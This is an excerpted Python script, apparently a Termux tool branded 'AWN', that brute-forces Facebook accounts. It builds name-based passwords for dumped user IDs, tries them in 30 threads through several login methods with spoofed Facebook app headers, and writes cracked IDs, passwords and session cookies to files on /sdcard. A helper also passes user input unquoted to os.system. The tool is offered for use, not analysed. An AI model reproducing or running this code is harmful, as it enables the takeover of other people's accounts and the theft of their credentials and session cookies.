...
from concurrent.futures import ThreadPoolExecutor as sarfrazAWN
from string import * 
...
sys.stdout.write('\x1b]2; AWN\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo =                                          """            
               ...
               AAA   WWWWWWWW                           WWWWWWWW   AAA               NNNNNNNN        NNNNNNNN
              A:::A  W::::::W                           W::::::W  A:::A              N:::::::N       N::::::N
             A:::::A W::::::W                           W::::::W A:::::A             N::::::::N      N::::::N
            A:::::::AW::::::W                           W::::::WA:::::::A            N:::::::::N     N::::::N
           A:::::::::AW:::::W           WWWWW           W:::::WA:::::::::A           N::::::::::N    N::::::N
          A:::::A:::::AW:::::W         W:::::W         W:::::WA:::::A:::::A          N:::::::::::N   N::::::N
         A:::::A A:::::AW:::::W       W:::::::W       W:::::WA:::::A A:::::A         N:::::::N::::N  N::::::N
        A:::::A   A:::::AW:::::W     W:::::::::W     W:::::WA:::::A   A:::::A        N::::::N N::::N N::::::N
       A:::::A     A:::::AW:::::W   W:::::W:::::W   W:::::WA:::::A     A:::::A       N::::::N  N::::N:::::::N
      A:::::AAAAAAAAA:::::AW:::::W W:::::W W:::::W W:::::WA:::::AAAAAAAAA:::::A      N::::::N   N:::::::::::N
     A:::::::::::::::::::::AW:::::W:::::W   W:::::W:::::WA:::::::::::::::::::::A     N::::::N    N::::::::::N
    A:::::AAAAAAAAAAAAA:::::AW:::::::::W     W:::::::::WA:::::AAAAAAAAAAAAA:::::A    N::::::N     N:::::::::N
   A:::::A             A:::::AW:::::::W       W:::::::WA:::::A             A:::::A   N::::::N      N::::::::N
  A:::::A               A:::::AW:::::W         W:::::WA:::::A               A:::::A  N::::::N       N:::::::N
 A:::::A                 A:::::AW:::W           W:::WA:::::A                 A:::::A N::::::N        N::::::N
AAAAAAA                   AAAAAAAWWW             WWWAAAAAAA                   AAAAAAANNNNNNNN         NNNNNNN
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
\033[1;37m Owner   :            AWAN MALIK
\033[1;37m Facebook:            AWAN MALIK
\033[1;37m Github  :            AWAN-MALIK
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back AWN Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[AWN] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AWNb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AWNb};{ckkk}"
                    print(f"\r{R} [AWN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/AWN_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/AWN_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [AWN-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/AWN_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[AWN] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [AWN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/AWN_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/AWN_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [AWN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[AWN] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[AWN] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [AWN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/AWN_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazAWN(max_workers=30) as AWNworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                AWNworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                AWNworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                AWNworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                AWNworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/AWN.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/AWN.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    AWN = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+AWN+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + AWN )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back AWN Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/AWN.txt\n') 
        filepath = input("Put File Name: ")
